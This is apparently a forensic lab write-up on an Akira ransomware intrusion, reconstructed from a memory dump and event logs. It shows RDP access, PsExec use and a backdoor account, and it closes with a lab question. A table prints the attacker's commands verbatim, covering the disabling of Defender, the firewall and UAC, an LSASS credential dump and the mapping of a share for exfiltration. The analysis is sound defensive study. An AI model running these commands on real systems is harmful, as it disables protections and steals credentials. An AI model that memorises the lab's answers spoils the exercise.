## Scenario

As a member of the DFIR team, you're tasked with investigating a ransomware attack involving Akira ransomware that has impacted critical systems. You’ve been provided with a memory dump from one of the compromised machines. Your goal is to analyze the memory for indicators of compromise, trace the ransomware’s entry point, and identify any malicious activity to assess the incident and guide the response strategy.

## Methodology

![](assets/cyberdef/Pasted%20image%2020260627230513.png)

![](assets/cyberdef/Pasted%20image%2020260627230707.png)

In this lab, there's memory dump file provided. I started by mounting the memory dump with `MemProcFs` to get an overview of the artifacts. To investigate, I extract the event logs with `EvtxECMD` and analyze it with `Timeline Explorer`.

![](assets/cyberdef/Pasted%20image%2020260627231058.png)

![](assets/cyberdef/Pasted%20image%2020260627232130.png)

![](assets/cyberdef/Pasted%20image%2020260627232419.png)

At `2024-09-18 11:34:56`, `192.168.60.129`attempted to establish an RDP connection to the `Shareserver.Cydef.enterprise` (`192.168.60.128`). By following the timeline, a suspicious executable (`PSEXESVC.exe`) was executed at `2024-09-18 11:36:40`. This executable is likely associated with **PsExec**, a Sysinternals utility used to execute commands remotely. By uploading the file hash to Virustotal, it was confirmed that the executable is **PsExec**.

![](assets/cyberdef/Pasted%20image%2020260627232917.png)

At `2024-09-18 11:36:40`, the attacker enumerate the running processes by running command `tasklist` and followed by disabling security controls, dumping credentials and data exfiltration.

| Command                                                                                                                                    | Purpose                                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------- |
| `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Set-MpPreference -DisableRealtimeMonitoring 1`                                 | Disable Microsoft Defender real-time protection          |
| `powershell" "Set-MpPreference -DisableBlockAtFirstSeen 1`                                                                                 | Disable Defender's Block at First Sight cloud protection |
| `powershell" "Set-MpPreference -DisableIOAVProtection 1`                                                                                   | Disable file scanning                                    |
| `netsh" advfirewall set allprofiles state off`                                                                                             | Disable Defender firewall for all profiles               |
| `reg" add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f`                                | Disable User Account Control (UAC)                       |
| `sc stop WinDefend`                                                                                                                        | Stop Microsoft Defender Antivirus                        |
| `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`                                   | Disable Defender through registry policy                 |
| `powershell.exe" -command "rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full` | Lsass memory dump                                        |
| `cmd.exe" /c "net use Z: \\HelpDesk\Dump_out`                                                                                              | Map network share                                        |
![](assets/cyberdef/Pasted%20image%2020260628000633.png)

Furthermore, I filtered Event Id 4720 to identify any user created. The result showed a user account `ITadmin_2`was created on `SHARESERVER`, confirming that the user was created to maintain persistence on the host.

![](assets/cyberdef/Pasted%20image%2020260628002233.png)

Lastly, the question mentioned that there's ransom note. It can be extracted using the `strings`command on the memory dump and filter onion to identify the ransom link.

> Q4: Identifying the process name of the attacker's tool is key to tracking their actions. What is the process name of the tool used by the attacker to remotely execute commands and perform malicious activities on the compromised FileServer?
